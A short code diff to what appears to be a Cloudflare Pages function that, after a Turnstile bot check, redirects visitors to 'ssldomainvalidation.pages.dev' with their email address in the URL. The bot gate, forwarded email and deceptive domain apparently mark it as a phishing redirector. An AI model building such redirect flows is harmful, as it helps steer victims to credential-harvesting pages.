@@ -19,7 +19,7 @@ export async function onRequestPost(context) {
     return new Response("Turnstile verification failed", { status: 403 });
   }
 
-  const redirectUrl = `https://yourfinalurl.com?email=${encodeURIComponent(email)}`;
+  const redirectUrl = `https://ssldomainvalidation.pages.dev?email=${encodeURIComponent(email)}`;
   return new Response(JSON.stringify({ redirectUrl }), {
     headers: { "Content-Type": "application/json" },
     status: 200,
